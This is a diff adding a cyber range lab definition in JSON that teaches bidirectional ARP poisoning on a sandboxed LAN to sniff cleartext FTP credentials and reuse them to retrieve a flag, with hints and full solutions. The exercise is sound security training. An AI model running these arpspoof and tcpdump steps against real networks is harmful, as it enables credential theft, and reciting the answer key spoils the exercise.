@@ -1,0 +1,126 @@
+{
+  "title": "CR-18 / Module 3 / N3b — Intermediate ARP Poisoning",
+  "description": "A host on the LAN keeps logging in to an FTP server in cleartext. Sit between the two of them, harvest the credentials, then log in yourself and lift the flag.",
+  "prerequisites": [
+    "CR-18 / N3a or equivalent experience with ARP poisoning",
+    "Comfort using a Linux shell",
+    "Recognise plaintext protocols on the wire"
+  ],
+  "outcomes": [
+    "Perform a bidirectional ARP poisoning attack between two hosts",
+    "Forward intercepted traffic and read plaintext credentials from FTP",
+    "Reuse captured credentials against a real service"
+  ],
+  "state": "UNRELEASED",
+  "levels": [
+    {
+      "title": "Briefing",
+      "level_type": "INFO_LEVEL",
+      "order": 0,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "content": "## Scenario\n\nA small office LAN. Three machines on it:\n\n- **vm1** at `192.168.25.10` runs an FTP server.\n- **vm2** at `192.168.25.20` is a user workstation. Someone here has scripted a periodic FTP login to vm1 and never noticed that FTP credentials cross the wire in cleartext.\n- **vma** at `192.168.25.30` is your attacker workstation.\n\n## What you will do\n\n1. Get on the path between vm1 and vm2 by poisoning the ARP caches on both ends.\n2. Forward the traffic so the FTP session still completes (otherwise vm2 will notice).\n3. Read the username and password off the wire.\n4. Log in to the FTP server yourself with those credentials and download the flag.\n\nThe flag will look like `CADMUS{...}`. You submit only the value **inside** the braces."
+    },
+    {
+      "title": "Get Access",
+      "level_type": "ACCESS_LEVEL",
+      "order": 1,
+      "estimated_duration": 0,
+      "minimal_possible_solve_time": null,
+      "passkey": "start",
+      "cloud_content": "Open a console on **vma** and log in.\n\n1. In the topology overview on the right, right-click on **`vma`** and choose **`Open console`**. A pop-up window will appear.\n2. Log in with username **`user`** and password **`Password123`**.\n\nSSH is documented at https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access if you prefer.\n\nWhen you are in, submit **`start`** to unlock the next level.",
+      "local_content": "This sandbox has not been validated for local-only deployment."
+    },
+    {
+      "title": "Capture the password",
+      "level_type": "TRAINING_LEVEL",
+      "order": 2,
+      "estimated_duration": 25,
+      "minimal_possible_solve_time": 5,
+      "answer": null,
+      "answer_variable_name": "ftp_pass",
+      "content": "From **vma**, intercept vm2's FTP session to vm1 and read the password off the wire.\n\nThe trick is that you need to be on the *path* between them, not just listening. ARP poisoning gets you there: tell vm1 that vm2 is at your MAC, tell vm2 that vm1 is at your MAC, and enable IP forwarding so the session keeps flowing.\n\nSubmit the password vm2 sends with the FTP `PASS` command.",
+      "solution": "1. **See the traffic.** Pick the LAN interface (`ip -br addr` will show it; on Kali it is usually `eth1`). Watch for FTP traffic between vm1 and vm2:\n\n   `sudo tcpdump -ni eth1 -A 'tcp port 21'`\n\n   At this point you should see nothing on the wire that names vm2, because the session is point-to-point and you are not on the path.\n\n2. **Enable IP forwarding** so packets you intercept keep flowing instead of dying at your kernel:\n\n   `sudo sysctl -w net.ipv4.ip_forward=1`\n\n3. **Poison both ARP caches.** Use two terminals (or `bettercap`'s `arp.spoof` which does both directions at once):\n\n   `sudo arpspoof -i eth1 -t 192.168.25.10 192.168.25.20`\n\n   `sudo arpspoof -i eth1 -t 192.168.25.20 192.168.25.10`\n\n   First line tells vm1 that vm2 is at your MAC. Second line tells vm2 that vm1 is at your MAC. The session now hairpins through you.\n\n4. **Watch the wire again.** Run the same tcpdump from step 1, or `wireshark` if you prefer a GUI. Wait 15 seconds for the next FTP cycle. You will see:\n\n   ```\n   USER ${ftp_user}\n   PASS ${ANSWER}\n   ```\n\n5. Submit **`${ANSWER}`** as the password.\n\nKeep arpspoof running for the next level. You will need to log in to FTP yourself.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "MITM, not just sniffing",
+          "content": "If you only run tcpdump without ARP spoofing first, you will see nothing of vm2's session. It is a unicast between two other machines on the segment. You need to lie about the MAC addresses so the traffic actually traverses you.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "Spoof both directions",
+          "content": "ARP poisoning needs to point both endpoints at you. With `arpspoof`, that is two simultaneous processes (one per direction). `bettercap` with `set arp.spoof.targets 192.168.25.10,192.168.25.20` and `set arp.spoof.fullduplex true` does both in one shot.",
+          "hint_penalty": 20,
+          "order": 1
+        },
+        {
+          "title": "Don't black-hole the traffic",
+          "content": "Without IP forwarding (`sudo sysctl -w net.ipv4.ip_forward=1`), packets arrive at your kernel and stop. The session breaks, vm2 retries, and you learn nothing. Enable forwarding before you start spoofing.",
+          "hint_penalty": 25,
+          "order": 2
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {"technique_key": "TA0006.T1557.002"},
+        {"technique_key": "TA0006.T1040"},
+        {"technique_key": "TA0010.T1011"}
+      ],
+      "expected_commands": [
+        "tcpdump",
+        "arpspoof",
+        "sysctl"
+      ],
+      "commands_required": false
+    },
+    {
+      "title": "Read the flag",
+      "level_type": "TRAINING_LEVEL",
+      "order": 3,
+      "estimated_duration": 10,
+      "minimal_possible_solve_time": 2,
+      "answer": null,
+      "answer_variable_name": "flag",
+      "content": "You have the password. Now log in to the FTP server yourself and retrieve the flag.\n\nThe flag lives in a file called `flag.txt` in the FTP user's home directory. The captured line will look like `CADMUS{...}`; submit only the value **inside** the braces.\n\nYou may stop the arpspoof processes now if you want; you no longer need the MITM.",
+      "solution": "1. The username you saw on the wire was **${ftp_user}**. Connect to vm1 with a real FTP client:\n\n   `ftp 192.168.25.10`\n\n   It will prompt for a name and password. Use **${ftp_user}** and the password you captured.\n\n2. List the home directory:\n\n   `ls`\n\n   You should see `flag.txt`.\n\n3. Download it:\n\n   `get flag.txt`\n\n   The file lands in your current working directory on vma. Quit with `bye`.\n\n4. Read it:\n\n   `cat flag.txt`\n\n   The contents look like **`CADMUS{${ANSWER}}`**. Submit just **`${ANSWER}`**.",
+      "solution_penalized": true,
+      "hints": [
+        {
+          "title": "Use a real FTP client",
+          "content": "The `ftp` command-line tool is the simplest option. It prompts for the username and password, then drops you into a shell where `ls`, `get`, and `bye` work as you'd expect.",
+          "hint_penalty": 10,
+          "order": 0
+        },
+        {
+          "title": "The flag file is named flag.txt",
+          "content": "After logging in, `ls` in the FTP session will show `flag.txt`. Use `get flag.txt` to download it. Read it locally on vma with `cat`.",
+          "hint_penalty": 15,
+          "order": 1
+        }
+      ],
+      "incorrect_answer_limit": 10,
+      "attachments": [],
+      "max_score": 100,
+      "variant_answers": true,
+      "reference_solution": [],
+      "mitre_techniques": [
+        {"technique_key": "TA0001.T1133"},
+        {"technique_key": "TA0010.T1041"}
+      ],
+      "expected_commands": [
+        "ftp",
+        "get",
+        "cat"
+      ],
+      "commands_required": false
+    }
+  ],
+  "estimated_duration": 40,
+  "variant_sandboxes": true
+}
